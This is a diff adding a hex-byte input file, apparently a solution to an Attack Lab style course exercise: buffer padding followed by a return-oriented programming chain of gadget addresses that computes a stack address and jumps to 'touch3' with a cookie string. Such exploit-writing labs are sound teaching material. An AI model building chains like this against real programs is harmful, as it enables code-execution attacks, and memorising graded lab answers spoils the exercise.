@@ -1,0 +1,37 @@
+/* buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* movq rsp,rax */
+46 1e 40 00 00 00 00 00
+
+/* movq rax,rdi */
+73 1d 40 00 00 00 00 00
+
+/* popq rax */
+ae 1d 40 00 00 00 00 00
+
+/* gap between gadgets */
+48 00 00 00 00 00 00 00
+
+/* movl eax,ecx */
+e0 1d 40 00 00 00 00 00
+
+/* movl ecx,edx */
+fb 1d 40 00 00 00 00 00
+
+/* movl edx,esi */
+25 1e 40 00 00 00 00 00
+
+/* lea (rdi,rsi,1),rax */
+da 1d 40 00 00 00 00 00
+
+/* movq rax,rdi */
+bb 1d 40 00 00 00 00 00
+
+/* touch3 addr */
+ce 1c 40 00 00 00 00 00
+
+/* cookie string */
+33 63 31 65 66 66 34 35 00
